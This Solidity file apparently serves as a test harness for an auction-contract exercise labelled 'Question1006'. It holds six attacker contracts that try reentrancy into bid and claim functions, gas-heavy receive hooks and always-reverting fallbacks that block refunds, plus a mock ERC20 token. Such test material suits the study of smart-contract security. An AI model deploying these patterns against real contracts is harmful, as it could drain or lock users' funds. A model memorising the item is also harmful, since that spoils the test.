// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
interface toAttack {
    function bid(uint256 auctionId) external payable;

    
    function createAuction(
        address _token,
        uint256 _startPrice,
        uint256 _endPrice,
        uint256 _startTime,
        uint256 _endTime,
        uint256 _tokenAmount
    ) external;

    function endAuctionAndClaimProfit(uint256 auctionId) external;
}

contract Question1006Attacker1 {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() external payable {
        toAttack(target).bid{value: msg.value}(1);
    }

    receive() payable external{
        uint res;
        for(uint i =0 ; i< 100; i++){
            res += uint(keccak256(abi.encode(i))) % 10000;
        }
    }

    fallback() external payable{

    }
}

contract Question1006Attacker2 {
    address public target;
    address public token;
    uint256 auctionId = 1;
    uint256 startPrice = 0.1 ether ;
    uint256 endPrice = 0.01 ether;
    uint256 startTime = block.timestamp + 1 days;
    uint256 endTime = block.timestamp + 2 days;
    uint256 tokenAmount = 1000;

    constructor(address _target, address _token) {
        target = _target;
        token = _token;
    }
    function init() external {
        ERC20(token).approve(target, tokenAmount * 1 ether);
        toAttack(target).createAuction(token, startPrice, endPrice, startTime, endTime, tokenAmount);
    }
    function attack() external payable {
        toAttack(target).endAuctionAndClaimProfit(1);
    }

    receive() payable external{
        uint res;
        for(uint i =0 ; i< 100; i++){
            res += uint(keccak256(abi.encode(i))) % 10000;
        }
    }

    fallback() external payable{

    }
}
contract Question1006Attacker3 {
    address public target;

    constructor(address _target){
        target = _target;
    }

    function attack() external payable{
        toAttack(target).bid{value: msg.value}(1);
    }

    fallback() external{
        revert("aaa");
    }
}
contract Question1006Attacker4 {
    address public target;

    uint private _stack;
    address public token;
    uint256 auctionId = 1;
    uint256 startPrice = 0.1 ether ;
    uint256 endPrice = 0.01 ether;
    uint256 startTime = block.timestamp + 1 days;
    uint256 endTime = block.timestamp + 2 days;
    uint256 tokenAmount = 1000;

    constructor(address _target, address _token) {
        target = _target;
        token = _token;
    }
    function init() external {
        ERC20(token).approve(target, tokenAmount * 1 ether);
        toAttack(target).createAuction(token, startPrice, endPrice, startTime, endTime, tokenAmount);
    }
    function attack() public payable {
        toAttack(target).endAuctionAndClaimProfit(1);
    }
    fallback() external{
        if (_stack < 1) {
            _stack += 1;
            attack();
        } else {
            revert("aaa");
        }
    }
}

contract Question1006Attacker5 {
    address public target;

    uint private _stack;

    constructor(address _target) {
        target = _target;
    }

    function attack() public payable {
        toAttack(target).bid{value: msg.value}(1);
    }

    receive() external payable {
        if (_stack < 1) {
            _stack += 1;
            attack();
        } else {
            _stack = 0;
        }
    }

    fallback() external payable {}
}

contract Question1006Attacker6 {
    address public target;

    uint private _stack;
    address public token;
    uint256 auctionId = 1;
    uint256 startPrice = 0.1 ether ;
    uint256 endPrice = 0.01 ether;
    uint256 startTime = block.timestamp + 1 days;
    uint256 endTime = block.timestamp + 2 days;
    uint256 tokenAmount = 1000;

    constructor(address _target, address _token) {
        target = _target;
        token = _token;
    }
    function init() external {
        ERC20(token).approve(target, tokenAmount * 1 ether);
        toAttack(target).createAuction(token, startPrice, endPrice, startTime, endTime, tokenAmount);
    }
    function attack() public payable {
        toAttack(target).endAuctionAndClaimProfit(1);
    }

    receive() external payable {
        if (_stack < 1) {
            _stack += 1;
        } else {
            attack();
            _stack = 0;
        }
    }

    fallback() external payable {}
}

contract MockERC20 is ERC20 {
    constructor() ERC20("MockERC20", "MCK"){

    }
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }

}